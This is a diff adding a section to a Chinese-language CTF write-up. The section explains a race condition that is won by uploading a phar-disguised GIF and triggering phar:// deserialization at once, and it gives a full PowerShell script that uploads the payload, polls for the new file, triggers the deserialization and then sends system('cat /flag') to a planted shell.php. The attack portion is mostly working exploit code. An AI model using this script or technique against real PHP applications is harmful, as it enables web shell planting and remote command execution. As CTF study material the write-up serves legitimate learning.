@@ -2092,3 +2092,94 @@ $p = null;
 
 echo "done\n";
 ```
+### 2.将构造好的脚本在vs上运行，新建一个powershell终端
+#### 1.一步步来失败
+先上传图片
+![alt text](image-35.png)
+再找新文件，再触发请求
+![alt text](image-37.png)
+上传 → 不停扫描找新文件 → 找到后停 → 再发请求触发 phar:// → 再检查 shell.ph
+问题：**找到文件到触发之间有时间差**。等我发触发请求时，文件已经被删了（0.5 秒窗口太短）。
+
+
+
+
+
+
+#### 2.一键
+上传 → 不停扫描
+         ↓
+    一发现新文件！
+         ↓
+    立刻在同一个瞬间触发 phar://  ← 关键！
+         ↓
+    才跳出循环
+```php
+$base = "http://80-2671a5c8-811d-4d94-b726-da4dbc5adfd0.challenge.ctfplus.cn"
+$bytes = [IO.File]::ReadAllBytes("C:\Users\j\Desktop\payload.gif")
+
+# 获取旧文件列表
+$oldHtml = (Invoke-WebRequest -Uri "$base/index.php" -UseBasicParsing).Content
+$oldFiles = @()
+[regex]::Matches($oldHtml, 'uploads/([a-f0-9]+)\.gif') | ForEach-Object { $oldFiles += $_.Groups[1].Value }
+Write-Host "旧文件: $($oldFiles -join ', ')"
+
+# 后台启动上传任务
+$uploadJob = Start-Job -ScriptBlock {
+    param($b, $base)
+    $boundary = "----WB" + [System.Guid]::NewGuid().ToString("N").Substring(0,16)
+    $LF = "`r`n"
+    $h = [System.Text.Encoding]::ASCII.GetBytes("--$boundary$LF" + "Content-Disposition: form-data; name=`"file`"; filename=`"s.gif`"$LF" + "Content-Type: image/gif$LF$LF")
+    $f = [System.Text.Encoding]::ASCII.GetBytes("$LF--$boundary--$LF")
+    $ms = New-Object System.IO.MemoryStream
+    $ms.Write($h,0,$h.Length)
+    $ms.Write($b,0,$b.Length)
+    $ms.Write($f,0,$f.Length)
+    $r = Invoke-WebRequest -Uri "$base/upload.php" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $ms.ToArray() -UseBasicParsing -TimeoutSec 10
+    return $r.Content
+} -ArgumentList $bytes, $base
+
+# 前台疯狂刷新，一发现新文件就立刻触发！
+$success = $false
+for ($i = 0; $i -lt 50; $i++) {
+    try {
+        $html = (Invoke-WebRequest -Uri "$base/index.php" -UseBasicParsing -TimeoutSec 5).Content
+        $ms2 = [regex]::Matches($html, 'uploads/([a-f0-9]+)\.gif')
+        foreach ($m in $ms2) {
+            $name = $m.Groups[1].Value
+            if ($oldFiles -notcontains $name) {
+                Write-Host "[$i] 发现新文件: $name，立刻触发！"
+                
+                # ★ 一发现就立刻触发 phar://
+                try {
+                    $trig = Invoke-WebRequest -Uri "$base/index.php?file=phar://uploads/$name.gif/x" -UseBasicParsing -TimeoutSec 5
+                    Write-Host "触发结果: $($trig.Content)"
+                } catch {
+                    Write-Host "触发报错: $($_.Exception.Message)"
+                }
+                
+                $success = $true
+                break
+            }
+        }
+        if ($success) { break }
+    } catch {}
+    Start-Sleep -Milliseconds 10
+}
+
+Write-Host "上传返回: $(Receive-Job $uploadJob)"
+Remove-Job $uploadJob -Force
+
+Start-Sleep -Milliseconds 500
+
+# 检查 shell.php
+Write-Host "`n=== 检查 shell.php ==="
+try {
+    $sh = Invoke-WebRequest -Uri "$base/shell.php" -Method Post -Body "cmd=system('cat /flag');echo END;" -UseBasicParsing -TimeoutSec 10
+    Write-Host "✅ flag 拿到了!"
+    Write-Host $sh.Content
+} catch {
+    Write-Host "❌ shell.php 还没好，多跑几次这个脚本"
+}
+```
+![alt text](image-36.png)
